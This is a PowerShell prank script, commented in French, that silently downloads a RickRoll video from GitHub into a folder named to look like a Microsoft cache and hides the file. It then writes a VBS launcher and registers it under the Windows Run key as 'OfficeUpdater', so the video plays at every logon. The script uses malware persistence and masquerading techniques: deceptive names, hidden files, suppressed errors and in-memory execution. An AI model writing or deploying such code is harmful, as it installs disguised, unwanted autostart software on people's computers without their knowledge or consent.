# ============== CONFIGURATION ==============
$DEBUG = $false

$AppData = $env:APPDATA
$LocalPath = Join-Path $AppData "Microsoft\CLRCache"    # dossier pas suspect

# Modification ici : gérer le cas où $MyInvocation.MyCommand.Path est nul
if ($MyInvocation.MyCommand.Path) {
    $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
} else {
    # fallback si lancé en mémoire : on met le dossier local par défaut
    $ScriptDir = $LocalPath
}

$VideoURL = "https://github.com/delete-user-56/RickRoll_OnStartup/raw/main/RickRoll.mp4"
$LogFile = Join-Path $ScriptDir "install.log"
# ===========================================

function Log {
    param ($msg)
    if ($DEBUG) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Add-Content -Path $LogFile -Value "[$timestamp] $msg"
    }
}

try {
    Log "=== Execution started ==="

    # Créer dossier local dans AppData si pas existant
    if (-not (Test-Path $LocalPath)) {
        New-Item -ItemType Directory -Path $LocalPath -Force | Out-Null
        Log "Created local folder at $LocalPath"
    }

    $VideoPath = Join-Path $LocalPath "rr.mp4"
    $VbsPath = Join-Path $LocalPath "player.vbs"

    # Vérification sécurisée de l'existence et taille du fichier vidéo
    $VideoExists = Test-Path $VideoPath

    if (-not $VideoExists -or ((Get-Item $VideoPath).Length -lt 1000)) {
        Log "Starting download of video..."
        Invoke-WebRequest -Uri $VideoURL -OutFile $VideoPath -UseBasicParsing -ErrorAction Stop *> $null
        Log "Download finished."
    } else {
        Log "Video already exists and looks valid"
    }

    # Cacher le fichier vidéo
    attrib +h $VideoPath
    Log "Set hidden attribute on video file"

    # Créer le script VBS corrigé (lance directement le mp4)
    $VbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "explorer.exe ""$VideoPath"""
"@

    # Enregistrer le VBS en ASCII (compatible)
    [System.IO.File]::WriteAllText($VbsPath, $VbsContent, [System.Text.Encoding]::ASCII)
    Log "VBS script created at $VbsPath"

    # Ajouter la clé de registre (remplace si existe) — lance le VBS directement
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "OfficeUpdater"
    $Command = "wscript.exe `"$VbsPath`""
    Set-ItemProperty -Path $RegPath -Name $Name -Value $Command
    Log "Added registry key: $Name -> $Command"

    Log "=== Execution finished OK ==="
} catch {
    Log "Error: $_"
}
